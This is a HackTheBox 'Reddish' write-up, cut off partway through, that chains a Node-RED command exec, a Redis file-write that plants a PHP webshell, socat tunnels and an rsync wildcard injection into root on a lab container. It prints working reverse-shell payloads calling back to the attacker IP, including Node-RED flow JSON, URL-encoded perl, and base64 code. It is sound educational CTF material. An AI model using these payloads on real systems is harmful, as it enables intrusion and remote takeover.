---
title: HTB: Reddish
url: https://0xdf.gitlab.io/2019/01/26/htb-reddish.html
date: 2019-01-26T14:00:00+00:00
difficulty: Medium [30]
os: Linux
tags: htb-reddish, hackthebox, ctf, node-red, nodejs, tunnel, php, redis, rsync, wildcard, docker, cpts-like
---

![](https://0xdfimages.gitlab.io/img/reddish-cover.png)Reddish is one of my favorite boxes on HTB. The exploitation wasn’t that difficult, but it required tunneling communications through multiple networks, and operate in bare-bones environments without the tools I’ve come to expect. Reddish was initially released as a medium difficulty (30 point) box, and after the initial user blood took 9.5 hours, and root blood took 16.5 hours, it was raised to hard (40). Later, it was upped again to insane (50). To get root on this box, I’ll start with an instance of node-red, a javascript browser-based editor to set up flows for IoT. I’ll use that to get a remote shell into a container. From there I’ll pivot using three other containers, escalating privilege in one, before eventually ending up in the host system. Throughout this process, I’ll only have connectivity to the initial container, so I’ll have to maintain tunnels for communication.

## Box Info

| Name | [Reddish](https://hackthebox.com/machines/reddish)  [Reddish](https://hackthebox.com/machines/reddish) [Play on HackTheBox](https://hackthebox.com/machines/reddish) |
| --- | --- |
| Release Date | [21 Jul 2018](https://twitter.com/hackthebox_eu/status/1019940301631352832) |
| Retire Date | 26 Jan 2019 |
| OS | Linux Linux |
| Base Points | ~~Medium [30]~~ ~~Hard [40]~~ Insane [50] |
| Rated Difficulty | Rated difficulty for Reddish |
| Radar Graph | Radar chart for Reddish |
| First Blood User | 09:36:39[72dergens 72dergens](https://app.hackthebox.com/users/22328) |
| First Blood Root | 16:28:48[ConnorJC ConnorJC](https://app.hackthebox.com/users/22605) |
| Creator | [yuntao yuntao](https://app.hackthebox.com/users/12438) |

## Recon

### nmap

Everything starts off simply enough, with one port open, http on 1880:

```

# Nmap 7.70 scan initiated Sat Jul 21 17:28:13 2018 as: nmap -sT -p- --min-rate 5000 -oA nmap/alltcp 10.10.10.94
Nmap scan report for 10.10.10.94
Host is up (0.023s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
1880/tcp open  vsat-control

# Nmap done at Sat Jul 21 17:28:24 2018 -- 1 IP address (1 host up) scanned in 11.21 seconds

# Nmap 7.70 scan initiated Sat Jul 21 17:36:56 2018 as: nmap -p 1880 -sC -sV -oA nmap/port1880 10.10.10.94
Nmap scan report for 10.10.10.94
Host is up (0.018s latency).

PORT     STATE SERVICE VERSION
1880/tcp open  http    Node.js Express framework
|_http-title: Error

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul 21 17:37:09 2018 -- 1 IP address (1 host up) scanned in 12.71 seconds

```

### NodeRed - port 1880

#### Overview

[NodeRed](https://nodered.org/) is a browser based editor to make flows for IoT devices and other technology to talk togetheri, and it runs on tcp 1880 by default.

#### Page root

Visiting `http://10.10.10.94:1880/` simply returns `Cannot GET /`

I can issue a POST with `curl`, and get back some json data:

```

root@kali# curl -X POST http://10.10.10.94:1880
{"id":"9d9909fed4f56c82a64de65d3ca9292d","ip":"::ffff:10.10.14.14","path":"/red/{id}"}

```

I wasted a lot of time trying to get this API to return something different based on data I posted to it. Finally, I noticed that data was giving me a new path to try, `/red/9d9909fed4f56c82a64de65d3ca9292d`.

#### Editor

On visiting that path, I’m presented with the Node-Red editor:

![1547676516514](https://0xdfimages.gitlab.io/img/1547676516514.png)

The editor has items grouped as “input”, “output”, “function”, “social”, “storage”, “analysis”, and “advanced”. Clicking on any given item will load a description of the item in the panel on the right.

Items can be dragged into the center pane, and connected with wires. Once my flow is complete, I’ll hit “Deploy”, and the flow is live. Some inputs also have a button on their left side. That item will generate its output when the button is pressed. For example, this “inject” will output a timestamp when the button is pressed.

![1532601704680](https://0xdfimages.gitlab.io/img/1532601704680.png)

## Code Execution / Shell in Node-Red

### Flows

In playing around with the editor, I built a few useful flows that will help with exploitation of Reddish. Flows show up nicely as images, but can also be imported/exported in json. I’ll provide the json for my flows in case you want to import and play with them. Just go to the menu, import, clipboard, and paste in the json.

### Simple Command Shell

The first flow I wrote was a simple loop that would connect back to a `nc` listener, and then execute whatever it received and return the results:

![1532601840168](https://0xdfimages.gitlab.io/img/1532601840168.png)

It will initiate the connection when the the flow to output `>`  is sent to stdin of the tcp connection. The TCP connection will come back to me. Then whatever I send back is sent to `exec`. The output of that is formatted and a prompt is added, and then sent back into the TCP connection, where I’ll receive it. Here’s the export:

```

[{"id":"3f7824bc.483a94","type":"tab","label":"Shell","disabled":false,"info":""},{"id":"9754e73a.fb7f5","type":"tcp request","z":"3f7824bc.483a94","server":"10.10.14.14","port":"9001","out":"sit","splitc":" ","name":"","x":520,"y":80,"wires":[["df9367ea.2fd12"]]},{"id":"df9367ea.2fd12","type":"exec","z":"3f7824bc.483a94","command":"","addpay":true,"append":"","useSpawn":"false","timer":"","oldrc":false,"name":"","x":170,"y":240,"wires":[["7cd3aeef.1a522"],["7cd3aeef.1a522"],[]]},{"id":"6a48f346.ccad1c","type":"inject","z":"3f7824bc.483a94","name":"","topic":"","payload":"> ","payloadType":"str","repeat":"","crontab":"","once":false,"onceDelay":0.1,"x":191.5,"y":50,"wires":[["9754e73a.fb7f5"]]},{"id":"7cd3aeef.1a522","type":"template","z":"3f7824bc.483a94","name":"results + prompt","field":"payload","fieldType":"msg","format":"handlebars","syntax":"mustache","template":"{{{payload}}}\n> ","output":"str","x":440,"y":240,"wires":[["9754e73a.fb7f5"]]}]

```

On pushing the button, I got a callback and could start to look around:

```

root@kali# nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.94] 51766
> id
uid=0(root) gid=0(root) groups=0(root)

> pwd
/node-red

> ls /home
node

> ls /home/node

```

### Callback Shell

In investigating the box, it’s incredibly bare: no `python`, `python3`, `php`, `nc`, `ifconfig`, `netstat`, `arp`. There is `perl` though.

I’ll use the `perl` reverse shell from [PentestMonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) to get a proper callback shell. The exec node runs a command. In this case, I’ll configure it to take input for the port, which is inserted into the middle of the command:

![1532602467605](https://0xdfimages.gitlab.io/img/1532602467605.png)

So the flow looks like:

![1532602489603](https://0xdfimages.gitlab.io/img/1532602489603.png)

```

[{"id":"6fe6b87a.30d988","type":"tab","label":"Reverse_TCP","disabled":false,"info":""},{"id":"6caeb9ad.e39468","type":"inject","z":"6fe6b87a.30d988","name":"9002","topic":"","payload":"9002","payloadType":"str","repeat":"","crontab":"","once":false,"onceDelay":0.1,"x":150,"y":160,"wires":[["97f946aa.853548"]]},{"id":"97f946aa.853548","type":"exec","z":"6fe6b87a.30d988","command":"perl -e 'use Socket;$i=\"10.10.14.14\";$p=","addpay":true,"append":";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'","useSpawn":"false","timer":"","oldrc":false,"name":"perl rev shell","x":350,"y":160,"wires":[["e2dba6a9.bb9fe8"],["e2dba6a9.bb9fe8"],[]]},{"id":"e2dba6a9.bb9fe8","type":"debug","z":"6fe6b87a.30d988","name":"","active":true,"tosidebar":true,"console":false,"tostatus":false,"complete":"false","x":570,"y":160,"wires":[]}]

```

Pushing the button leads to shell!

```

root@kali# nc -lnvp 9002
listening on [any] 9002 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.94] 45908
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# hostname
nodered

```

### File Upload

Since the box doesn’t have `curl` or `wget` or `nc`, I created a file upload flow, that would callback to a given port, and then what it reads to `/tmp/.df/upload`:

![1532602816978](https://0xdfimages.gitlab.io/img/1532602816978.png)

The string “9003” is not used by the TCP node, it’s just there because I needed something, and it was a good visual reminder as to what port the flow expected.

## nodered Container

### Local Enumeration

The local box is quite bare. I’m already running as root. As mentioned before, almost none of programs I’d expect on a linux host are present. Also, none of the IP addresses match 10.10.10.94:

```

# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
9: eth1@if10: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:13:00:03 brd ff:ff:ff:ff:ff:ff
    inet 172.19.0.3/16 brd 172.19.255.255 scope global eth1
       valid_lft forever preferred_lft forever
11: eth0@if12: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:12:00:02 brd ff:ff:ff:ff:ff:ff
    inet 172.18.0.2/16 brd 172.18.255.255 scope global eth0
       valid_lft forever preferred_lft forever

```

I can conclude I’m in a container, and I didn’t find much else of interest in it.

Since I’m in a container, I’ll start tracking what I know about it:

![](https://0xdfimages.gitlab.io/img/reddish-network_map-1.png)

### Network Enumeration

It’s fairly clear I need to move outside this container, and since there’s no obvious path to the host, I’ll look around the environment.

#### Check arp

The arp cache shows only the two .1 ips, which are likely the host:

```

# cat /proc/net/arp
IP address       HW type     Flags       HW address            Mask     Device
172.19.0.1       0x1         0x2         02:42:bc:00:fb:35     *        eth1
172.18.0.1       0x1         0x2         02:42:de:ac:1d:ce     *        eth0

```

#### nmap Host

I uploaded a [statically compiled](https://github.com/andrew-d/static-binaries) `nmap` (and a copy of `/etc/services` from kali to the same path) to check out the .1s:

```

# ./nmap-static -p- -sT --min-rate 5000 172.18.0.1

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2018-07-24 10:57 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.18.0.1
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.00016s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
1880/tcp open  unknown
MAC Address: 02:42:1F:A4:77:C3 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 15.01 seconds
# ./nmap-static -p- -sT --min-rate 5000 172.19.0.1

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2018-07-24 10:57 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.19.0.1
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.00013s latency).
Not shown: 65534 closed ports
PORT     STATE    SERVICE
1880/tcp filtered unknown
MAC Address: 02:42:F2:E9:5E:A1 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 14.98 seconds

```

I suspect it is the host, and that that 1880 is the forwarded port to the nodered vm.

#### Ping Sweep

Next I’ll start a ping sweep to look for other hosts/containers, and find two other hosts worth looking at in the 172.19.0.0/24 subnet. Based on my current `ifconfig` and my assumption about the .1s being the gateway, I can label the output leaving two unknowns:

```

# for i in $(seq 1 254); do (ping -c 1 172.18.0.$i | grep "bytes from" | cut -d':' -f1 | cut -d' ' -f4 &); done
172.18.0.1  <-- host
172.18.0.2  <-- node-red container
# for i in $(seq 1 254); do (ping -c 1 172.19.0.$i | grep "bytes from" | cut -d':' -f1 | cut -d' ' -f4 &); done                    
172.19.0.2
172.19.0.1  <-- host
172.19.0.3  <-- nodered container
172.19.0.4

```

Note the use of `()` and `&` in the ping sweep so that this runs in just over a second, and doesn’t take 256 seconds to run.

I’ve got two new hosts to track:

![](https://0xdfimages.gitlab.io/img/reddish-network_map-2.png)

## Pivoting

### Overview

There’s many ways to set up tunnels to allow my pivot here. A few that come to mind are:
1. Get a meterpreter session with nodered, and use the `portfwd` capability to tunnel from my local box into the network (like ssh tunneling).
2. Copy an ssh client to nodered, and ssh back into my kali box with a reverse tunnel.
3. Build a listening interface (likely web) with NodeRed, and use that to tunnel traffic.
4. Using software designed for tunneling.

The third would be interesting, and I’d love to see a flow for someone who pulled it off, but I’ll leave that an an exercise for the reader.

ssh isn’t too bad, and I’ll show how to achieve it in [Beyond Root](#creating-port-forwards-with-dropbear) using `dropbear`.

I’ve learned of a couple new tunneling software recently, and I hope to follow up with post on them soon.

For now, I’m going to use Metasploit. I typically avoid using Metasploit, but this is a good case for it.

### Getting Meterpreter

I’ll get a meterpreter session going with nodered.

This is actually really easy with existing setup. I already have a flow that generates a callback to port 9002. I’ll catch that in metasploit, and then upgrade that shell to meterpreter.

Open a handler with payload `linux/x64/shell/reverse_tcp`, and catch a callback from my flow:

```

msf exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------

Payload options (linux/x64/shell/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.14      yes       The listen address (an interface may be specified)
   LPORT  9002             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target

msf exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.14:9002 
[*] Sending stage (38 bytes) to 10.10.10.94
[*] Command shell session 1 opened (10.10.14.14:9002 -> 10.10.10.94:44602) at 2018-07-27 06:33:58 -0400

/bin/sh: 0: can't access tty; job control turned off
# 

```

For some reason, the first command run in this new shell can be garbage and fail. After making sure to get that out of the way, I’ll background the session (ctrl-z):

```

# id
/bin/sh: 1: j^H��j!Xu�j: not found
/bin/sh: 1: X�H�/bin/shSH��RWH��id: not found
# id
uid=0(root) gid=0(root) groups=0(root)
# ^Z
Background session 1? [y/N]  y
msf exploit(multi/handler) >

```

Metasploit has a built in upgrade path to Meterpretere using `sessions -u`:

```

msf exploit(multi/handler) > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.10.14.14:4433 
[*] Sending stage (861480 bytes) to 10.10.10.94
[*] Meterpreter session 2 opened (10.10.14.14:4433 -> 10.10.10.94:58956) at 2018-07-27 06:37:15 -0400
[*] Command stager progress: 100.00% (773/773 bytes)
msf exploit(multi/handler) > sessions -i 2
[*] Starting interaction with 2...

meterpreter >

```

### Adding Forwards

Now I can add forwards over this session. I’ll still do everything else through my initial session, because I’m more comfortable there. But if i want to add a route, I’ll issue a command such as:

```

meterpreter > portfwd add -l 80 -r 192.168.1.6 -p 80

```

That will add a pipe from 80 on my local machine to 80 on 192.168.1.6.

I’ll show these as I bring them up throughout (the one above was just an example).

## www / redis Containers

### Note About IPs

One thing to note - on each reset / boot, Docker seems to randomize the IP addresses of the three containers, nodered, www, and redis. They always seem to be .2, .3, and .4, but which is which is something I need to determine each time. For the sake of this post, I’m working with redis as .2, nodered as .3, and www as .4.

### nmap

Get an `nmap` scan of these two new hosts:

```

# ./nmap-static -p- -sT --min-rate 5000 172.19.0.2

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2018-07-24 11:19 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for reddish_composition_redis_1.reddish_composition_internal-network (172.19.0.2)                                                                       
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.00016s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
6379/tcp open  unknown
MAC Address: 02:42:AC:13:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 2.49 seconds
# ./nmap-static -p- -sT --min-rate 5000 172.19.0.4

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2018-07-24 11:19 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for reddish_composition_www_1.reddish_composition_internal-network (172.19.0.3)                                                                         
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.00016s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 02:42:AC:13:00:03 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 2.39 seconds

```

I can see the docker names, reddish\_composition\_redis\_1 and reddish\_composition\_www\_1, and the listening ports which fit for each server, 6379 for redis, and 80 for www.

### Web Site

#### Access

I’ll use the meterpreter shell to port forward localhost 80 through the session to 172.19.0.4:

```

meterpreter > portfwd add -l 80 -r 172.19.0.4 -p 80
[*] Local TCP relay created: :80 <-> 172.19.0.4:80

```

Visiting `http://127.0.0.1/` gives the page:

![1532616312104](https://0xdfimages.gitlab.io/img/1532616312104.png)

#### Javascript

Much more interesting than the displayed page is the javascript in the source:

```

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
        <title>Reddish</title>
        <script src="{{ "/img/jquery.js" type="text/javascript"></script>
        <script type="text/javascript">
            $(document).ready(function () {
                incrCounter();
                getData();
            });

            function getData() {
                $.ajax({
                    url: "8924d0549008565c554f8128cd11fda4/ajax.php?test=get hits",
                    cache: false,
                    dataType: "text",
                    success: function (data) {
                        console.log("Number of hits:", data)
                    },
                    error: function () {
                    }
                });
            }

            function incrCounter() {
                $.ajax({
                    url: "8924d0549008565c554f8128cd11fda4/ajax.php?test=incr hits",
                    cache: false,
                    dataType: "text",
                    success: function (data) {
                        console.log("HITS incremented:", data);
                    },
                    error: function () {
                    }
                });
            }

            /*
            * TODO
            *
            * 1. Share the web folder with the database container (Done)
            * 2. Add here the code to backup databases in /f187a0ec71ce99642e4f0afbd441a68b folder
            * ...Still don't know how to complete it...
            */
            function backupDatabase() {
                $.ajax({
                    url: "8924d0549008565c554f8128cd11fda4/ajax.php?backup=...",
                    cache: false,
                    dataType: "text",
                    success: function (data) {
                        console.log("Database saved:", data);
                    },
                    error: function () {
                    }
                });
            }
        </script>
    </head>
    <body><h1>It works!</h1>
    <p>This is the default web page for this server.</p>
    <p>The web server software is running but no content has been added, yet.</p>
    </body>
</html>

```

There’s two important take-aways from this source:
1. There are ajax calls to `8924d0549008565c554f8128cd11fda4/ajax.php`. Based on the parameters values for the `test` of `get hits` and `incr hits` (which look like redis commands), I can hypothesize that these commands are executed on the redis database.
2. There’s some self-proclaimed incomplete code having to do with backing up that database. It does indicate that the web folder is shared with the database container.

I can also test out these function in the firefox debug console:

![1532623444474](https://0xdfimages.gitlab.io/img/1532623444474.png)

What about trying to exercise the backup function? Visiting `http://127.0.0.1/8924d0549008565c554f8128cd11fda4/ajax.php?backup=/etc/passwd` eventually has a timeout, which makes sense since the comments said it was not yet implemented:

![1532619153975](https://0xdfimages.gitlab.io/img/1532619153975.png)

This error message does give me the absolute web path, which is the default apache path, `/var/www/html`.

### Database

So I can do some interaction with the database through the website and JavaScript… But I can also interact directly with the Redis database.

Just like with www, I’ll use meterpreter to set up a tunnel into the subnet with www and redis:

```

meterpreter > portfwd add -l 6379 -r 172.19.0.2 -p 6379
[*] Local TCP relay created: :6379 <-> 172.19.0.2:6379

```

I can do basic enumeration with nc:

```

root@kali# nc 127.0.0.1 6379
get hits
$-1
incr hits
:1
get hits
$1
1
incr hits
:2
get hits
$1
2

```

Very cool.

I also installed `redis-cli` for interaction with the db:
1. `git clone http://github.com/antirez/redis.git`
2. `cd redis`
3. `make redis-cli`
4. `ln -s /opt/redis/src/redis-cli /usr/local/bin/redis-cli`

```

root@kali# redis-cli  # by default, connects to localhost 6379
127.0.0.1:6379> incr hits
HISTORY: /root/.rediscli_history
(integer) 1
127.0.0.1:6379> incr hits
HISTORY: /root/.rediscli_history
(integer) 2
127.0.0.1:6379> get hits
HISTORY: /root/.rediscli_history
"2"

```

### WebShell

[This post](https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html) on PacketStorm details how I can use Redis to write arbitrary files on disk. I can flush the database, write some data into it, and then back it up to a target location. The article talks about writing an SSH key. SSH isn’t enabled here, but, because I know that the database server shares disk space with www, I can write a web shell.

#### Exploit Limitations

This isn’t by any means perfect. For example, the database will compress repeated text patterns, so could I lose some of the text I want to write. So for example, when I tried to write `<br/>` into multiple places in a php file, only the first actually made it through as desired. Even if I tried using `<br/>` and `<br />`, the second `<br` was replaced with binary data. Similarly, when I wrote a command to get a `perl` reverse shell, the pattern `,">&S");` was replaced and thus broke the script.

#### Exploit to WebShell

Luckily for me, I can write a simple php webshell, and there’s no repeats, and php doesn’t care about garbage before or after the shell.

Steps (all in `redis-cli`):
1. flush the database
2. write shell to database
3. set directory
4. set filename
5. save

```

root@kali# cat redis.txt  # show the shell file

<?php system($_REQUEST['cmd']); ?>

root@kali# redis-cli -h 127.0.0.1  flushall  # step 1
OK
root@kali# cat redis.txt | redis-cli -x set crackit  # step 2
OK
root@kali# redis-cli 
127.0.0.1:6379> config set dir /var/www/html/8924d0549008565c554f8128cd11fda4/  # step 3
HISTORY: /root/.rediscli_history
OK
127.0.0.1:6379> config set dbfilename "df.php"       # step 4
HISTORY: /root/.rediscli_history
OK
127.0.0.1:6379> save                                 # step 5
HISTORY: /root/.rediscli_history
OK

```

Now check out `http://127.0.0.1/8924d0549008565c554f8128cd11fda4/df.php?cmd=id`:

![1532623689773](https://0xdfimages.gitlab.io/img/1532623689773.png)

There’s other mess there, but the `id` command ran and returned results, which I marked in red.

`hostname` shows the host is named www:

![1532632149713](https://0xdfimages.gitlab.io/img/1532632149713.png)

#### Script Redis WebShell

The files in the web directory seem to be cleared out every 3 minutes (I’ll confirm this soon), so I have to work quick. I scripted the upload:

```

#!/bin/sh

redis-cli -h 127.0.0.1 flushall
cat redis.txt | redis-cli -h 127.0.0.1 -x set crackit
redis-cli -h 127.0.0.1 config set dir /var/www/html/8924d0549008565c554f8128cd11fda4/
redis-cli -h 127.0.0.1 config set dbfilename "df.php"
redis-cli -h 127.0.0.1 save

```

On running, it puts the cmd shell in place:

```

root@kali# ./upload_shell.sh
OK
OK
OK
OK
OK

```

### Interactive Shell

Now with command execution, I’ll get an interactive shell.

#### Connectivity - socat

It doesn’t look like I can connect all the back to kali from this host. `which ping` returns `/bin/ping`, but trying to `ping 10.10.14.14` doesn’t result in anything when watching in `tcpdump`. When I try to `ping 172.19.0.3` (nodered), I get results:

![1532632323890](https://0xdfimages.gitlab.io/img/1532632323890.png)

So I need to pivot through nodered. I’ll upload a static copy of socat to the box using the Node-Red flow for upload. Now I can use `socat` one of two ways:
1. Relay traffic through nodered back to kali
2. Catch the callback on nodered

I’ll do the first one, so in the shell on nodered, create a tunnel:

```

# /tmp/s tcp-listen:223,fork tcp:10.10.14.14:223 &

```

That will run in the background, and forward any traffic that hits port 223 on nodered to my workstation on port 223.

#### Execution

And, like nodered, there’s a limited toolset available. Luckily, `perl` is still present (a phrase I never thought I’d say).

To get this working, it took a fair amount of playing with the url encoding. In the end, I had success by visiting the following url in a browser: `http://127.0.0.1/8924d0549008565c554f8128cd11fda4/df.php?cmd=perl%20-e%20%27use%20Socket%3b$i%3d%22172.19.0.3%22%3b$p%3d2223%3bsocket(S,PF_INET,SOCK_STREAM,getprotobyname(%22tcp%22))%3bif(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,%22%3E%26S%22)%3bopen(STDOUT,%22%3E%26S%22)%3bopen(STDERR,%22%3E%26S%22)%3bexec(%22/bin/sh+-i%22)%3b}%3b%27`

Sometimes, the box would get into a state where my callback would come through, but it would return this error and die:

```

root@kali# nc -lnvp 223
listening on [any] 223 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.94] 40772
Insecure $ENV{PATH} while running setuid at -e line 1.

```

I could fix this by adding `$ENV{PATH} = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin";` to the start of my perl command, which is the path from nodered.

#### Success

Putting it all together, I have a webshell executing a perl reverse shell command, calling back to nodered on port 223, which forwards that traffic to my workstation on port 223.
1. Upload shell:

   ```

   root@kali# ./upload_shell.sh
   OK
   OK
   OK
   OK
   OK

   ```
2. Trigger perl shell: `http://127.0.0.1/8924d0549008565c554f8128cd11fda4/df.php?cmd=perl%20-e%20%27$ENV{PATH}%20=%20%22/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin%22;use%20Socket%3b$i%3d%22172.19.0.3%22%3b$p%3d2223%3bsocket(S,PF_INET,SOCK_STREAM,getprotobyname(%22tcp%22))%3bif(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,%22%3E%26S%22)%3bopen(STDOUT,%22%3E%26S%22)%3bopen(STDERR,%22%3E%26S%22)%3bexec(%22/bin/sh+-i%22)%3b}%3b%27`
3. Catch callback:

   ```

   root@kali# nc -lnvp 223
   listening on [any] 223 ...
   connect to [10.10.14.14] from (UNKNOWN) [10.10.10.94] 41236
   /bin/sh: 0: can't access tty; job control turned off
   $ id
   uid=33(www-data) gid=33(www-data) groups=33(www-data)
   $ hostname
   www

   ```

Now, I can see `user.txt`… but I can’t open it:

```

$ cd /home/somaro
$ ls
user.txt
$ cat user.txt
cat: user.txt: Permission denied

```

I can also see `ajax.php`, which shows the commands running at the redis server:

```

<?php

require_once 'lib/Autoloader.php';
Autoloader::register();
$json = new JsonResult();
$config = new Config();
foreach ($config->getPool() as $key => $server) {
        $client = new Client($server);
        $result = $client->sendCmd($_GET['test']);
        echo $result;
}

```

## Privesc: www-data –> root (user.txt)

### Identifying Backup Cron

To get to `user.txt`, I’ll need to privesc. Looking around the box, there wasn’t a ton going on, so I decided to look for interesting processes starting and stopping. I’ve been a huge fan of `pspy` in the past for this, but since I’m two hops deep at this point, I’ll just using a bash script:

```

#!/bin/bash

IFS=$'\n'

old=$(ps -eo command)
while true; do
    new=$(ps -eo command)
    diff <(echo "$old") <(echo "$new") | grep [\<\>]
    sleep .3
    old=$new
done

```

Running it shows some interesting scripts being run about every 3 minutes:

```

$ ./proc.sh
> /usr/sbin/CRON
> /bin/sh -c sh /backup/backup.sh
> sh /backup/backup.sh
> rsync -a rsync://backup:873/src/backup/ /var/www/html/
> rsync -a rsync://backup:873/src/backup/ /var/www/html/

```

Looking at `/backup/backup.sh`, it is saving the database, then removing the web folders and bringing them back in from a host named backup:

```

cd /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
rsync -a *.rdb rsync://backup:873/src/rdb/
cd / && rm -rf /var/www/html/*
rsync -a rsync://backup:873/src/backup/ /var/www/html/
chown www-data. /var/www/html/f187a0ec71ce99642e4f0afbd441a68b

```

### Exploiting the Wildcard

I can exploit the command `rsync -a *.rdb rsync://backup:873/src/rdb`, specifically the wildcard character. Because of how Unix handles wildcards, I can create a file named `-e sh p.rdb`, and that will evaluate to run `sh p.rdb`. The technique is detailed [here](https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt).

I’ll first set up a tunnel on nodered:

```

# /tmp/s tcp-listen:9010,fork tcp:10.10.14.14:9010 &

```

Now write a perl reverse shell into a file and create the other file to run it. I’ll use base64 to easily move small files back and forth:

```

root@kali# echo cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTcyLjE5LjAuMyI7JHA9OTAxMDtzb2NrZXQoUyxQRl9JTkVULFNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCJ0Y3AiKSk7aWYoY29ubmVjdChTLHNvY2thZGRyX2luKCRwLGluZXRfYXRvbigkaSkpKSl7b3BlbihTVERJTiwiPiZTIik7b3BlbihTVERPVVQsIj4mUyIpO29wZW4oU1RERVJSLCI+JlMiKTtleGVjKCIvYmluL3NoIC1pIik7fTsnCg== | base64 -d
perl -e 'use Socket;$i="172.19.0.3";$p=9010;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

```

I’ll create my reverse shell script as `p.rdb`, and then create the file that will call that abusing the wildcard with `touch`:

```

$ echo cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTcyLjE5LjAuMyI7JHA9OTAxMDtzb2NrZXQoUyxQRl9JTkVULFNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCJ0Y3AiKSk7aWYoY29ubmVjdChTLHNvY2thZGRyX2luKCRwLGluZXRfYXRvbigkaSkpKSl7b3BlbihTVERJTiwiPiZTIik7b3BlbihTVERPVVQsIj4mUyIpO29wZW4oU1RERVJSLCI+JlMiKTtleGVjKCIvYmluL3NoIC1pIik7fTsnCg== | base64 -d > /var/www/html/f187a0ec71ce99642e4f0afbd441a68b/p.rdb

$ touch /var/www/html/f187a0ec71ce99642e4f0afbd441a68b/-e\ sh\ p.rdb

```

When the cron runs, I’ll catch a callback as root on www when the backup script runs:

```

root@kali# nc -lnvp 9010
listening on [any] 9010 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.94] 51920
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# hostname
www

```

And I can grab `user.txt`:

```

# cat /home/somaro/user.txt
c09aca7c...

```

I can also verify the backup cron job that was running (though I now notice I could have read this even as www–data):

```

# pwd
/etc/cron.d

# ls -l
total 4
-rw-r--r-- 1 root root 38 May  4 20:55 backup

# cat backup
*/3 * * * * root sh /backup/backup.sh

```

## File Upload to www

To move to the next steps, I’ll want to get files uploaded to www, which is challenging without `curl`, `wget`, or `nc`. Here’s how I do it:

Start a tunnel on nodered that will listen (in this case on 8080) and forward that to my host:

```

# /tmp/s TCP-LISTEN:8080,fork TCP:10.10.14.14:8888 &

```

Use `perl` to request file:

```

# perl -e 'use File::Fetch; my $url = "http://172.19.0.3:8080/socat"; my $ff = File::Fetch->new(uri => $url); my $file = $ff->fetch() or die $ff->error;'

```

Serve from workstation:

```

